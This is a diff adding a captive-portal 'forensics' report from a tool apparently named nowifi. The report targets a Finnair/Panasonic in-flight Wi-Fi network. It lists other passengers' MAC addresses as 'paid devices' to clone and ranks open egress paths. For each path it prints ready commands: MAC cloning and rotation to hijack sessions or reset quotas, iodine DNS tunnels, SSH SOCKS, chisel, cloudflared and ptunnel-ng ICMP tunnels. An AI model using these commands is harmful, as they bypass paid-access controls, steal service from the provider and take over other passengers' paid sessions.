@@ -1,0 +1,172 @@
+# nowifi captive forensics — 20260529T182618Z
+# iface=en0 gw=172.19.248.1 ip=172.19.248.39 self_mac=fa:0a:71:0b:ba:19
+# provider=Panasonic/Nordic-Sky(Finnair) enforcement=MAC-based gateway=kong
+
+===== 1. NETWORK STATE =====
+     route to: default
+  destination: default
+         mask: default
+      gateway: 172.19.248.1
+    interface: en0
+        flags: <UP,GATEWAY,DONE,STATIC,PRCLONING,GLOBAL>
+   recvpipe  sendpipe  ssthresh  rtt,msec    rttvar  hopcount      mtu     expire
+         0         0         0         0         0         0      1500         0 
+  DNS: 100.100.100.100,8.8.8.8,fd7a:115c:a1e0::53
+  DHCP lease:
+  IPv6 default route: 
+
+===== 2. MAC-CLONE CANDIDATES (Panasonic = MAC-based enforcement; nowifi #1) =====
+  ? (172.19.248.1) at 0:d:2e:0:40:2 on en0 ifscope [ethernet]
+  ? (172.19.248.2) at 0:d:2e:0:0:a8 on en0 ifscope [ethernet]
+  ? (172.19.248.8) at 82:f8:d8:89:da:ea on en0 ifscope [ethernet]
+  ? (172.19.248.9) at 7e:95:9d:cb:25:ed on en0 ifscope [ethernet]
+  ? (172.19.248.11) at 8e:56:50:e2:64:cc on en0 ifscope [ethernet]
+  ? (172.19.248.12) at 9a:ee:5d:44:f:c2 on en0 ifscope [ethernet]
+  ? (172.19.248.14) at fa:89:ff:16:1c:ac on en0 ifscope [ethernet]
+  ? (172.19.248.18) at 5e:8:9b:24:75:f5 on en0 ifscope [ethernet]
+  ? (172.19.248.21) at 76:ba:89:67:ae:2e on en0 ifscope [ethernet]
+  ? (172.19.248.22) at 3e:50:68:b8:ab:8c on en0 ifscope [ethernet]
+  ? (172.19.248.23) at da:ce:27:ab:c3:da on en0 ifscope [ethernet]
+  ? (172.19.248.24) at d2:6c:50:45:37:b on en0 ifscope [ethernet]
+  ? (172.19.248.25) at a4:83:e7:79:28:4c on en0 ifscope [ethernet]
+  ? (172.19.248.28) at 26:fd:ab:ff:e9:fb on en0 ifscope [ethernet]
+  ? (172.19.248.30) at 5a:84:ce:aa:fb:8b on en0 ifscope [ethernet]
+  ? (172.19.248.33) at 5e:7d:be:92:7a:e3 on en0 ifscope [ethernet]
+  ? (172.19.248.34) at d2:83:c8:6c:c6:ff on en0 ifscope [ethernet]
+  ? (172.19.248.35) at 72:d4:bf:30:a:f3 on en0 ifscope [ethernet]
+  ? (172.19.248.36) at 6a:ea:46:b8:8f:79 on en0 ifscope [ethernet]
+  ? (172.19.248.38) at c6:24:0:7a:55:68 on en0 ifscope [ethernet]
+  ? (172.19.248.41) at e:ec:8:20:7d:12 on en0 ifscope [ethernet]
+  ? (172.19.248.42) at 66:10:55:f6:43:37 on en0 ifscope [ethernet]
+  ? (172.19.248.43) at c6:1:3a:8a:b0:69 on en0 ifscope [ethernet]
+  ? (172.19.248.44) at 36:1a:a:b7:71:33 on en0 ifscope [ethernet]
+  ? (172.19.248.45) at 72:1:3c:10:33:1b on en0 ifscope [ethernet]
+  ? (172.19.248.46) at c6:6a:b1:4a:92:7 on en0 ifscope [ethernet]
+  ? (172.19.248.47) at 62:8d:85:4d:dc:fc on en0 ifscope [ethernet]
+  ? (172.19.248.48) at d2:1f:0:f0:f0:37 on en0 ifscope [ethernet]
+  ? (172.19.248.49) at 6:fe:37:c5:d6:32 on en0 ifscope [ethernet]
+  ? (172.19.248.50) at 52:c:5b:78:92:8f on en0 ifscope [ethernet]
+  ? (172.19.248.51) at ea:cc:f8:9e:47:28 on en0 ifscope [ethernet]
+  ? (172.19.248.52) at ca:f8:e8:ce:71:75 on en0 ifscope [ethernet]
+  ? (172.19.248.54) at 66:f4:f6:ed:e0:3e on en0 ifscope [ethernet]
+  ? (172.19.248.56) at 92:1:d6:93:ea:a on en0 ifscope [ethernet]
+  -> 34 neighbor MACs visible (each a candidate authed/paid device)
+
+===== 3. EGRESS CHANNELS (OPEN here = exploitable hole) =====
+  TCP OPEN  1.1.1.1:443
+  TCP OPEN  8.8.8.8:53
+  TCP OPEN  9.9.9.9:443
+  TCP OPEN  github.com:22
+  UDP OPEN  8.8.8.8:53
+  UDP OPEN  1.1.1.1:53
+  UDP OPEN  pool.ntp.org:123
+  UDP OPEN  1.1.1.1:443
+
+===== 4. DNS EXTERNAL RECURSION (dns_tunnel viability) =====
+  RECURSES  via 172.19.248.1 -> 198.35.26.224
+  RECURSES  via 8.8.8.8 -> 198.35.26.224
+  RECURSES  via 1.1.1.1 -> 198.35.26.224
+  RECURSES  via 9.9.9.9 -> 198.35.26.224
+
+===== 5. DoH ENDPOINTS (doh_tunnel — Cloudflare/Google often allowlisted) =====
+  DoH OK    cloudflare-dns.com (HTTP 200)
+  DoH blkd  dns.google (code=none)
+
+===== 6. ICMP ECHO (icmp_tunnel — NOT in nowifi Panasonic order; potential gap) =====
+  ICMP OPEN to 1.1.1.1
+
+===== 7. ALLOWLIST + SNI FILTERING (domain-fronting / proxy-hop viability) =====
+  allow? finnair.com -> blocked
+  allow? www.nordic-sky.finnair.com -> 200
+  allow? portal.panasonic.aero -> blocked
+  allow? js.stripe.com -> blocked
+  allow? cloudflare.com -> 301
+  allow? cdn.jsdelivr.net -> blocked
+  (any non-portal domain returning 200 = allowlisted hop; CDN 200 + you control origin behind it = domain-front candidate)
+
+===== 8. PORTAL GATEWAY SURFACE (Kong / proxy quirks) =====
+  X-Cache: miss, hit-fresh
+  X-Cache: HIT from bc01
+  Via: http/1.1 uslax1-edge-fx-051.ts.apple.com (acdn/302.16436), http/1.1 uslax1-edge-fx-051.ts.apple.com (acdn/302.16436), 1.1 bc01 (squid)
+
+===== 9. ENFORCEMENT MODEL (how the limit is keyed -> reset vector) =====
+  your MAC: fa:0a:71:0b:ba:19  (if limit is MAC-keyed: mac_rotate = fresh session/quota)
+  cookies/session: clear browser state + rotate MAC to reset a per-device quota
+
+===== 10. DIFF vs FULL-ACCESS BASELINE =====
+  baseline: baseline-20260529T182215Z.txt
+  (channels OPEN in both = survive enforcement = your reliable holes)
+
+===== HOLES FOUND (ranked; each maps to a nowifi technique + command) =====
+
+  [HIGH] mac_clone_idle
+       what : 34 paid devices on subnet; clone an idle one to inherit its session
+       run  : sudo nowifi  # auto-runs mac_clone_idle first for Panasonic; OR manual: sudo ifconfig en0 ether 0:d:2e:0:40:2 && sudo ipconfig set en0 DHCP
+
+  [HIGH] tcp53_tunnel
+       what : TCP/53 egress open to 8.8.8.8
+       run  : chisel client <server>:53 socks  # or ssh -p53
+
+  [HIGH] ssh_egress
+       what : TCP/22 open to github.com — direct SSH SOCKS
+       run  : ssh -D 8080 -p22 user@<your-server>  # then SOCKS proxy :8080
+
+  [HIGH] dns_tunnel
+       what : UDP/53 egress open to 8.8.8.8 — iodine/dnscat2 tunnel
+       run  : sudo iodine -f -r 8.8.8.8 <your-iodine-domain.example>  # (iodined must run on your authoritative NS)
+
+  [HIGH] dns_tunnel
+       what : UDP/53 egress open to 1.1.1.1 — iodine/dnscat2 tunnel
+       run  : sudo iodine -f -r 1.1.1.1 <your-iodine-domain.example>  # (iodined must run on your authoritative NS)
+
+  [HIGH] dns_tunnel
+       what : resolver 172.19.248.1 returns external A records — full recursion = DNS tunnel works
+       run  : sudo iodine -r 172.19.248.1 <your-iodine-domain.example>   # NULL/TXT tunnel; fallback nowifi dns_tunnel
+
+  [HIGH] dns_tunnel
+       what : resolver 8.8.8.8 returns external A records — full recursion = DNS tunnel works
+       run  : sudo iodine -r 8.8.8.8 <your-iodine-domain.example>   # NULL/TXT tunnel; fallback nowifi dns_tunnel
+
+  [HIGH] dns_tunnel
+       what : resolver 1.1.1.1 returns external A records — full recursion = DNS tunnel works
+       run  : sudo iodine -r 1.1.1.1 <your-iodine-domain.example>   # NULL/TXT tunnel; fallback nowifi dns_tunnel
+
+  [HIGH] dns_tunnel
+       what : resolver 9.9.9.9 returns external A records — full recursion = DNS tunnel works
+       run  : sudo iodine -r 9.9.9.9 <your-iodine-domain.example>   # NULL/TXT tunnel; fallback nowifi dns_tunnel
+
+  [HIGH] doh_tunnel
+       what : cloudflare-dns.com reachable + answers — DoH tunnel / cloudflared works
+       run  : cloudflared access tcp --hostname <your-host> --url localhost:1080  # or dns2tcp-over-DoH
+
+  [HIGH] icmp_tunnel
+       what : ICMP echo reaches the internet — ptunnel-ng covert channel
+       run  : sudo ptunnel-ng -p <your-server-ip>  (server: sudo ptunnel-ng on the far side)
+
+  [MED] tcp443_tunnel
+       what : TCP/443 egress open to 1.1.1.1 (non-allowlisted IP)
+       run  : wstunnel/chisel/openvpn over :443 to your server 1.1.1.1-side
+
+  [MED] tcp443_tunnel
+       what : TCP/443 egress open to 9.9.9.9 (non-allowlisted IP)
+       run  : wstunnel/chisel/openvpn over :443 to your server 9.9.9.9-side
+
+  [MED] ntp_tunnel
+       what : UDP/123 (NTP) open to pool.ntp.org — covert channel
+       run  : nowifi technique ntp_tunnel; or ntp-exfil PoC
+
+  [MED] quic_tunnel
+       what : UDP/443 (QUIC) open to 1.1.1.1
+       run  : masque/quic tunnel (nowifi quic_tunnel)
+
+  [MED] mac_rotate
+       what : if quota is per-MAC, a fresh random MAC resets it
+       run  : sudo ifconfig en0 ether $(openssl rand -hex 6 | sed 's/\(..\)/\1:/g;s/:$//') && sudo ipconfig set en0 DHCP
+
+# fastest path on Panasonic/Nordic-Sky: just run  sudo nowifi  (auto-orders
+#   mac_clone_idle -> dns_tunnel -> doh_tunnel -> ntp_tunnel -> quic_tunnel).
+# This report tells you WHICH of those the portal left open, so you can also
+#   drive a single technique manually with the printed command.
+
+SAVED: /Users/mikko/github/nowifi/forensics/holes-20260529T182618Z.txt
+JSON: /Users/mikko/github/nowifi/forensics/holes-20260529T182618Z.json
